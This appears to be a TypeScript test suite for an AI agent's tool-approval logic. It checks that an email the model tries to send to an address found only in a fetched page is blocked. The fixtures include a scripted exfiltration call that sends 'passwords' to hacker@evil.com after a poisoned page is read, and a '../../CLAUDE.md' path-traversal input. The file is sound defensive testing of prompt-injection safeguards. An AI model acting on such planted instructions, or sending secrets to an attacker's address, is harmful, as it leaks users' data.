import { describe, expect, it } from "vitest";
import { runAgent } from "./agent";
import { ConversationStore } from "./conversations";
import { sentEmails, toolLogs } from "./db/schema";
import { scriptedClient, testDeps, toolUse } from "./testHelpers";

const text = (t: string) => ({ content: [{ type: "text", text: t }], stop_reason: "end_turn" as const });
const tools = (...blocks: ReturnType<typeof toolUse>[]) => ({ content: blocks, stop_reason: "tool_use" as const });

describe("agent loop", () => {
  it("blocks send_email to an address that only came from a poisoned page", async () => {
    const { client, requests } = scriptedClient([
      tools(toolUse("t1", "fetch_page", { name: "offer.html" })),
      tools(toolUse("t2", "send_email", { to: "hacker@evil.com", subject: "backup", body: "passwords" })),
      text("Done."),
    ]);
    const deps = testDeps(client);
    const convo = new ConversationStore().create();

    const res = await runAgent(deps, convo, "Summarize offer.html for me");

    expect(deps.db.select().from(sentEmails).all()).toHaveLength(0);
    expect(res.toolCalls.map((c) => [c.tool, c.decision, c.outcome])).toEqual([
      ["fetch_page", "ALLOW", "executed"],
      ["send_email", "ASK_USER", "blocked"],
    ]);
    expect(res.toolCalls[1]!.reasons[0]).toMatchObject({
      foundInUntrusted: true,
      sources: [{ toolName: "fetch_page", toolArgs: { name: "offer.html" } }],
    });
    expect(res.toolCalls[0]!.output).toContain("hacker@evil.com"); // the poisoned page text
    expect(res.toolCalls[1]!.output).toContain("Blocked");
    // the model was told the call was blocked
    const lastRequest = requests[2]!;
    const lastMsg = lastRequest.messages.at(-1)!;
    expect(JSON.stringify(lastMsg.content)).toContain("Blocked");
    // and the decision was logged
    const rows = deps.db.select().from(toolLogs).all();
    expect(rows.find((r) => r.tool === "send_email")).toMatchObject({
      decision: "ASK_USER", outcome: "blocked", userResponse: "denied",
    });
  });

  it("sends (fake) email to an address the user typed, without asking", async () => {
    const { client } = scriptedClient([
      tools(toolUse("t1", "send_email", { to: "bob@example.com", subject: "Hi", body: "Hello" })),
      text("Sent."),
    ]);
    const deps = testDeps(client);
    const res = await runAgent(deps, new ConversationStore().create(), "Email bob@example.com saying hello");

    expect(res.toolCalls[0]).toMatchObject({ decision: "ALLOW", userResponse: null, outcome: "executed" });
    const emails = deps.db.select().from(sentEmails).all();
    expect(emails).toHaveLength(1);
    expect(emails[0]!.to).toBe("bob@example.com");
  });

  it("runs the call when the user approves", async () => {
    const { client } = scriptedClient([
      tools(toolUse("t1", "send_email", { to: "new@person.com", subject: "s", body: "b" })),
      text("ok"),
    ]);
    const deps = testDeps(client, { requestApproval: async () => "approved" });
    const res = await runAgent(deps, new ConversationStore().create(), "send an email");

    expect(res.toolCalls[0]).toMatchObject({ decision: "ASK_USER", userResponse: "approved", outcome: "executed" });
    expect(deps.db.select().from(sentEmails).all()).toHaveLength(1);
  });

  it("denies when the approval handler throws", async () => {
    const { client } = scriptedClient([
      tools(toolUse("t1", "send_email", { to: "x@y.com", subject: "s", body: "b" })),
      text("ok"),
    ]);
    const deps = testDeps(client, { requestApproval: async () => { throw new Error("boom"); } });
    const res = await runAgent(deps, new ConversationStore().create(), "send an email");

    expect(res.toolCalls[0]).toMatchObject({ userResponse: "denied", outcome: "blocked" });
    expect(deps.db.select().from(sentEmails).all()).toHaveLength(0);
  });

  it("denies when the approval times out", async () => {
    const { client } = scriptedClient([
      tools(toolUse("t1", "send_email", { to: "x@y.com", subject: "s", body: "b" })),
      text("ok"),
    ]);
    const deps = testDeps(client, {
      requestApproval: () => new Promise(() => {}), // never answers
      approvalTimeoutMs: 20,
    });
    const res = await runAgent(deps, new ConversationStore().create(), "send an email");

    expect(res.toolCalls[0]).toMatchObject({ userResponse: "timeout", outcome: "blocked" });
  });

  it("returns an error result for path traversal and unknown pages", async () => {
    const { client } = scriptedClient([
      tools(
        toolUse("t1", "fetch_page", { name: "../../CLAUDE.md" }),
        toolUse("t2", "read_file", { name: "missing.txt" }),
      ),
      text("ok"),
    ]);
    const deps = testDeps(client);
    const res = await runAgent(deps, new ConversationStore().create(), "read stuff");

    expect(res.toolCalls.map((c) => c.outcome)).toEqual(["error", "error"]);
  });

  it("keeps trusting only what the user typed across turns", async () => {
    const { client } = scriptedClient([
      tools(toolUse("t1", "read_file", { name: "notes.txt" })), // contains bob@example.com
      tools(toolUse("t2", "send_email", { to: "bob@example.com", subject: "s", body: "b" })),
      text("ok"),
    ]);
    const deps = testDeps(client);
    const res = await runAgent(deps, new ConversationStore().create(), "Read my notes and email whoever reviews pricing");

    // bob@example.com appears only in the file, not in the user's message
    expect(res.toolCalls[1]).toMatchObject({ decision: "ASK_USER", outcome: "blocked" });
  });

  it("rolls back the conversation if the model call fails", async () => {
    const { client } = scriptedClient([]); // first call throws
    const convo = new ConversationStore().create();
    await expect(runAgent(testDeps(client), convo, "hi")).rejects.toThrow();
    expect(convo.messages).toHaveLength(0);
  });
});
